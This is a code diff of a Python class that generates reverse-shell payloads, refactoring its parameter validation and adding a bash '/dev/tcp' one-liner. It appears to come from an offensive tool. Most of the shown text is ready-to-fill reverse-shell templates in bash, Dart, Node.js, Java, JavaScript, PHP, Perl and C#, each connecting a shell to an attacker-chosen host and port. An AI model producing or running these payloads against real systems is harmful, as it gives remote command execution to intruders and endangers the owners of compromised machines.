@@ -8,46 +8,148 @@ from utilities.Colors import color
 
 
 class TemplateGenerator:
-
     def __init__(self, **kwargs):
+        self.__temp_message = None
+        self.__platform_allowed = ['linux', 'mac', 'windows']
+        self.__type_allowed = ['bind', 'reverse']
         self.__status = {'message': '', 'code': 0}
-        self.__language = None
         self.__payload = None
+        self.__target = None
+        self.__port = None
+        self.__platform = None
         self.__type = None
-        self.__platform_permitted = ['linux', 'windows', 'mac']
-        self.__type_permitted = ['bind', 'reverse']
 
-        try:
-            self.__platform = kwargs['platform'].strip().lower()
-            self.__target = kwargs['target']
-            self.__port = str(kwargs['port'])
-            self.__type = str(kwargs['type'])
-        except KeyError as Error:
+        for key, value in kwargs.items():
+            self.__target = kwargs.get('target') if (kwargs.get('target') is not None) else False
+            self.__port = str(kwargs.get('port')) if (kwargs.get('port') is not None) else False
+            self.__platform = kwargs.get('platform') if (kwargs.get('platform') is not None) else False
+            self.__type = kwargs.get('type') if (kwargs.get('type') is not None) else False
+
+    def validate_parameters(self):
+        self.__temp_message = ""
+        if not self.__target:
+            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
+                "green", "target") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
+        if not self.__port:
+            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
+                "green", "port") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
+        if not self.__platform:
+            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
+                "green", "platform") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
+        if not self.__type:
+            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow", "{") + color.color(
+                "green", "type") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
+
+        if len(self.__temp_message) > 0:
             self.__status['code'] = 500
-            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
-                                                                                             "{") + color.color("lgray",
-                                                                                                                Error) + color.color(
-                "yellow", "} ") + color.color("lgray", "are mandatory in the class") + color.color("yellow",
-                                                                                                   " ShellGenerator")
+            self.__status['message'] = self.__temp_message
 
-            if 'platform' in Error.args[0]:
-                self.__platform = ""
+        else:
+            self.__status['code'] = 200
 
-        if not self.__platform in self.__platform_permitted:
-            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
-                                                                                             "{") + color.color("lgray",
-                                                                                                                'platform') + color.color(
-                "yellow", "} ") + color.color("lgray", "not is valid in the class") + color.color("yellow",
-                                                                                                  " ShellGenerator")
-        if not self.__type in self.__type_permitted:
-            self.__status['message'] = color.color("lgray", "The parameters ") + color.color("yellow",
-                                                                                             "{") + color.color("lgray",
-                                                                                                                'type') + color.color(
-                "yellow", "} ") + color.color("lgray", "not is valid in the class") + color.color("yellow",
-                                                                                                  " ShellGenerator")
+        return self.__status
+
+    def validate_parameter_linux(self):
+        self.__temp_message = ""
+        if not self.__platform.lower() in self.__platform_allowed or not "linux" in self.__platform.lower():
+            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
+                                                                                                                self.__platform) + color.color(
+                "yellow", "}") + color.color("lgray", " not allowed for this payloads")
+
+        if len(self.__temp_message) > 0:
+            self.__status['code'] = 500
+            self.__status['message'] = self.__temp_message
+
+        else:
+            self.__status['code'] = 200
+
+        return self.__status
+
+    def validate_parameter_windows(self):
+        self.__temp_message = ""
+        if not self.__platform.lower() in self.__platform_allowed or not "windows" in self.__platform.lower():
+            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
+                                                                                                                self.__platform) + color.color(
+                "yellow", "}") + color.color("lgray", " not allowed for this payloads")
+
+        if len(self.__temp_message) > 0:
+            self.__status['code'] = 500
+            self.__status['message'] = self.__temp_message
+
+        else:
+            self.__status['code'] = 200
+
+        return self.__status
+
+    def validate_parameter_mac(self):
+        self.__temp_message = ""
+        if not self.__platform.lower() in self.__platform_allowed or not "mac" in self.__platform.lower():
+            self.__temp_message += color.color("lgray", "Platform ") + color.color("yellow", "{") + color.color("green",
+                                                                                                                self.__platform) + color.color(
+                "yellow", "}") + color.color("lgray", " not allowed for this payloads")
+
+        if len(self.__temp_message) > 0:
+            self.__status['code'] = 500
+            self.__status['message'] = self.__temp_message
+
+        else:
+            self.__status['code'] = 200
+
+        return self.__status
+
+    def validate_parameter_type_bind(self):
+        self.__temp_message = ""
+        if not self.__type.lower() in self.__type_allowed or not 'bind' in self.__type.lower():
+            self.__temp_message += color.color("lgray", "Type payload ") + color.color("yellow", "{") + color.color(
+                "green",
+                self.__type) + color.color(
+                "yellow", "}") + color.color("lgray", " not allowed for this payloads")
+
+        if len(self.__temp_message) > 0:
+            self.__status['code'] = 500
+            self.__status['message'] = self.__temp_message
+
+        else:
+            self.__status['code'] = 200
+
+        return self.__status
+
+    def validate_parameter_type_reverse(self):
+        self.__temp_message = ""
+        if not self.__type.lower() in self.__type_allowed or not 'reverse' in self.__type.lower():
+            self.__temp_message += color.color("lgray", "Type payload ") + color.color("yellow", "{") + color.color(
+                "green",
+                self.__type) + color.color(
+                "yellow", "}") + color.color("lgray", " not allowed for this payloads")
+
+        if len(self.__temp_message) > 0:
+            self.__status['code'] = 500
+            self.__status['message'] = self.__temp_message
+
+        else:
+            self.__status['code'] = 200
+
+        return self.__status
+
+    def bash_i(self):
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
+            try:
+                self.__payload = "/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(self.__target, self.__port)
+
+                self.__status['code'] = 200
+                self.__status['message'] = self.__payload
+            except Exception as Error:
+                self.__status['code'] = 500
+                self.__status['message'] = self.__status['message'] if len(
+                    self.__status['message']) != 0 else color.color(
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
+        return self.__status
 
     def C(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "#include <stdio.h>\n" \
                                  "#include <sys/socket.h>\n" \
@@ -85,34 +187,30 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
         return self.__status
 
     def Dart(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "import \'dart:io\';\n" \
                                  "import \'dart:convert\';\n" \
                                  " \n" \
                                  "main() {\n" \
-                                 "  Socket.connect(\""+self.__target+"\", "+self.__port+").then((socket) {\n" \
-                                 "    socket.listen((data) {\n" \
-                                 "      Process.start(\'/bin/bash\', []).then((Process process) {\n" \
-                                 "        process.stdin.writeln(new String.fromCharCodes(data).trim());\n" \
-                                 "        process.stdout\n" \
-                                 "          .transform(utf8.decoder)\n" \
-                                 "          .listen((output) { socket.write(output); });\n" \
-                                 "      });\n" \
-                                 "    },\n" \
-                                 "    onDone: () {\n" \
-                                 "      socket.destroy();\n" \
-                                 "    });\n" \
-                                 "  });\n" \
-                                 "}\n"
+                                 "  Socket.connect(\"" + self.__target + "\", " + self.__port + ").then((socket) {\n" \
+                                                                                                "    socket.listen((data) {\n" \
+                                                                                                "      Process.start(\'/bin/bash\', []).then((Process process) {\n" \
+                                                                                                "        process.stdin.writeln(new String.fromCharCodes(data).trim());\n" \
+                                                                                                "        process.stdout\n" \
+                                                                                                "          .transform(utf8.decoder)\n" \
+                                                                                                "          .listen((output) { socket.write(output); });\n" \
+                                                                                                "      });\n" \
+                                                                                                "    },\n" \
+                                                                                                "    onDone: () {\n" \
+                                                                                                "      socket.destroy();\n" \
+                                                                                                "    });\n" \
+                                                                                                "  });\n" \
+                                                                                                "}\n"
 
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
@@ -122,29 +220,24 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def Nodejs(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "(function(){\n" \
                                  "   var net = require(\"net\"),\n" \
                                  "       cp = require(\"child_process\"),\n" \
                                  "       sh = cp.spawn(\"/bin/bash\", []);\n" \
                                  "    var client = new net.Socket();\n" \
-                                 "   client.connect("+self.__port+", \""+self.__target+"\", function(){\n" \
-                                 "        client.pipe(sh.stdin);\n" \
-                                 "        sh.stdout.pipe(client);\n" \
-                                 "        sh.stderr.pipe(client);\n" \
-                                 "    });\n" \
-                                 "    return /a/; // Prevents the Node.js application from crashing\n" \
-                                 "})();\n"
+                                 "   client.connect(" + self.__port + ", \"" + self.__target + "\", function(){\n" \
+                                                                                               "        client.pipe(sh.stdin);\n" \
+                                                                                               "        sh.stdout.pipe(client);\n" \
+                                                                                               "        sh.stderr.pipe(client);\n" \
+                                                                                               "    });\n" \
+                                                                                               "    return /a/; // Prevents the Node.js application from crashing\n" \
+                                                                                               "})();\n"
 
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
@@ -154,27 +247,22 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def Java(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "public class shell {\n" \
                                  "    public static void main(String[] args) {\n" \
                                  "        Process p;\n" \
                                  "        try {\n" \
-                                 "            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/"+self.__target+"/"+self.__port+" 0>&1\");\n" \
-                                 "            p.waitFor();\n" \
-                                 "            p.destroy();\n" \
-                                 "        } catch (Exception e) {}\n" \
-                                 "    }\n" \
-                                 "}"
+                                 "            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + self.__target + "/" + self.__port + " 0>&1\");\n" \
+                                                                                                                                                                 "            p.waitFor();\n" \
+                                                                                                                                                                 "            p.destroy();\n" \
+                                                                                                                                                                 "        } catch (Exception e) {}\n" \
+                                                                                                                                                                 "    }\n" \
+                                                                                                                                                                 "}"
 
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
@@ -184,46 +272,36 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def Java_2(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "public class shell {\n" \
                                  "    public static void main(String[] args) {\n" \
-                                 "        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/"+self.__target+"/"+self.__port+" 0>&1\")\n" \
-                                 "            .redirectErrorStream(true);\n" \
-                                 "        try {\n" \
-                                 "            Process p = pb.start();\n" \
-                                 "            p.waitFor();\n" \
-                                 "            p.destroy();\n" \
-                                 "        } catch (Exception e) {}\n" \
-                                 "    }\n" \
-                                 "}\n"
-
+                                 "        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/" + self.__target + "/" + self.__port + " 0>&1\")\n" \
+                                                                                                                                                                     "            .redirectErrorStream(true);\n" \
+                                                                                                                                                                     "        try {\n" \
+                                                                                                                                                                     "            Process p = pb.start();\n" \
+                                                                                                                                                                     "            p.waitFor();\n" \
+                                                                                                                                                                     "            p.destroy();\n" \
+                                                                                                                                                                     "        } catch (Exception e) {}\n" \
+                                                                                                                                                                     "    }\n" \
+                                                                                                                                                                     "}\n"
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
             except Exception as Error:
                 self.__status['code'] = 500
                 self.__status['message'] = self.__status['message'] if len(
                     self.__status['message']) != 0 else color.color(
-                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
+                    "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
+                                                                                                              str(Error))
         return self.__status
 
     def Java_3(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "import java.io.InputStream;\n" \
                                  "import java.io.OutputStream;\n" \
@@ -231,34 +309,34 @@ class TemplateGenerator:
                                  "\n" \
                                  "public class shell {\n" \
                                  "    public static void main(String[] args) {\n" \
-                                 "        String host = \""+self.__target+"\";\n" \
-                                 "        int port = "+self.__port+";\n" \
-                                 "        String cmd = \"/bin/bash\";\n" \
-                                 "        try {\n" \
-                                 "            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n" \
-                                 "            Socket s = new Socket(host, port);\n" \
-                                 "            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n" \
-                                 "            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n" \
-                                 "            while (!s.isClosed()) {\n" \
-                                 "                while (pi.available() > 0)\n" \
-                                 "                    so.write(pi.read());\n" \
-                                 "                while (pe.available() > 0)\n" \
-                                 "                    so.write(pe.read());\n" \
-                                 "                while (si.available() > 0)\n" \
-                                 "                    po.write(si.read());\n" \
-                                 "                so.flush();\n" \
-                                 "                po.flush();\n" \
-                                 "                Thread.sleep(50);\n" \
-                                 "                try {\n" \
-                                 "                    p.exitValue();\n" \
-                                 "                    break;\n" \
-                                 "                } catch (Exception e) {}\n" \
-                                 "            }\n" \
-                                 "            p.destroy();\n" \
-                                 "            s.close();\n" \
-                                 "        } catch (Exception e) {}\n" \
-                                 "    }\n" \
-                                 "}\n"
+                                 "        String host = \"" + self.__target + "\";\n" \
+                                                                              "        int port = " + self.__port + ";\n" \
+                                                                                                                    "        String cmd = \"/bin/bash\";\n" \
+                                                                                                                    "        try {\n" \
+                                                                                                                    "            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n" \
+                                                                                                                    "            Socket s = new Socket(host, port);\n" \
+                                                                                                                    "            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n" \
+                                                                                                                    "            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n" \
+                                                                                                                    "            while (!s.isClosed()) {\n" \
+                                                                                                                    "                while (pi.available() > 0)\n" \
+                                                                                                                    "                    so.write(pi.read());\n" \
+                                                                                                                    "                while (pe.available() > 0)\n" \
+                                                                                                                    "                    so.write(pe.read());\n" \
+                                                                                                                    "                while (si.available() > 0)\n" \
+                                                                                                                    "                    po.write(si.read());\n" \
+                                                                                                                    "                so.flush();\n" \
+                                                                                                                    "                po.flush();\n" \
+                                                                                                                    "                Thread.sleep(50);\n" \
+                                                                                                                    "                try {\n" \
+                                                                                                                    "                    p.exitValue();\n" \
+                                                                                                                    "                    break;\n" \
+                                                                                                                    "                } catch (Exception e) {}\n" \
+                                                                                                                    "            }\n" \
+                                                                                                                    "            p.destroy();\n" \
+                                                                                                                    "            s.close();\n" \
+                                                                                                                    "        } catch (Exception e) {}\n" \
+                                                                                                                    "    }\n" \
+                                                                                                                    "}\n"
 
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
@@ -268,19 +346,14 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def Javascript(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
-                self.__payload = "String command = \"var host = \'"+self.__target+"\';  \" +\n \
-                           \"var port = "+self.__port+"; \" +\n" " \
+                self.__payload = "String command = \"var host = \'" + self.__target + "\';  \" +\n \
+                           \"var port = " + self.__port + "; \" +\n" " \
                            \"var cmd = \'/bin/bash\'; \" +\n" "\
                            \"var s = new java.net.Socket(host, port); \" +\n" " \
                            \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start(); \" +\n" " \
@@ -306,8 +379,8 @@ class TemplateGenerator:
                            \"}\" +\n" " \
                            \"p.destroy(); \" +\n" " \
                            \"s.close();\";\n" \
-                            "String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\");\n" \
-                            "ref.add(new StringRefAddr(\"x\", x);"
+                                                          "String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\");\n" \
+                                                          "ref.add(new StringRefAddr(\"x\", x);"
 
                 self.__status['code'] = 200
                 self.__status['message'] = self.__payload
@@ -317,16 +390,11 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def PHP(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "<?php\n" \
                                  "// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n" \
@@ -451,17 +519,12 @@ class TemplateGenerator:
                 self.__status['message'] = self.__status['message'] if len(
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
-                                                                                                      str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
+                                                                                                              str(Error))
         return self.__status
 
     def Perl(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "use strict;                                                             \n" \
                                  "use Socket;                                                             \n" \
@@ -558,16 +621,11 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def Haskell_1(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "module Main where\n" \
                                  "\n" \
@@ -582,16 +640,11 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def CsharpBash_i(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "using System;\n" \
                                  "using System.Diagnostics;\n" \
@@ -621,16 +674,11 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
 
     def CsharpTcpClient(self):
-        if self.__type == 'reverse' and 'linux' in self.__platform or 'mac' in self.__platform:
+        if self.validate_parameters()['code'] == 200 and self.validate_parameter_linux()['code'] == 200 and \
+                self.validate_parameter_type_reverse()['code'] == 200:
             try:
                 self.__payload = "using System;\n" \
                                  "using System.Text;\n" \
@@ -710,10 +758,4 @@ class TemplateGenerator:
                     self.__status['message']) != 0 else color.color(
                     "red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",
                                                                                                               str(Error))
-        else:
-            self.__status['code'] = 500
-            self.__status['message'] = color.color("red", "[-] ") + color.color("lgray",
-                                                                                "Platform or type payload not allowed for this payload") if len(
-                self.__status['message']) == 0 else self.__status['message']
-
         return self.__status
